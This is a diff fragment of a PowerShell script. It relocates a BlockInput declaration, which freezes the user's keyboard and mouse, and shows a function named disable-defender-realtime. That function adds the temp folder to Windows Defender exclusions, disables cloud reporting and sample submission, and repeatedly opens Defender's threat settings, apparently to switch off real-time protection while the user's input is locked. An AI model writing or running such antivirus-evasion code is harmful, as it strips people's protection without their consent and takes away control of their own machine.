@@ -21,6 +21,12 @@ public struct RECT {
 Add-Type -AssemblyName System.Windows.Forms
 $area = ([Windows.Forms.Screen]::PrimaryScreen).WorkingArea
 
+$code = @'
+[DllImport("user32.dll")]
+public static extern bool BlockInput(bool fBlockIt);
+'@
+$userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru
+
 function current-cursor-position {
 	[Alias('ccp')]
 	param(
@@ -41,15 +47,10 @@ function disable-defender-realtime {
 	param(
 		[bool]$status = $true
 	)
-$code = @'
-[DllImport("user32.dll")]
-public static extern bool BlockInput(bool fBlockIt);
-'@
 	Add-MpPreference -ExclusionPath "$global:temp" -Force
 	Set-MpPreference -MAPSReporting Disable
 	Set-MpPreference -SubmitSamplesConsent NeverSend
 	if ((Get-MpComputerStatus).RealTimeProtectionEnabled -ne $status) {
-		$userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru
 		do {
 			explorer windowsdefender://ThreatSettings
 			do {
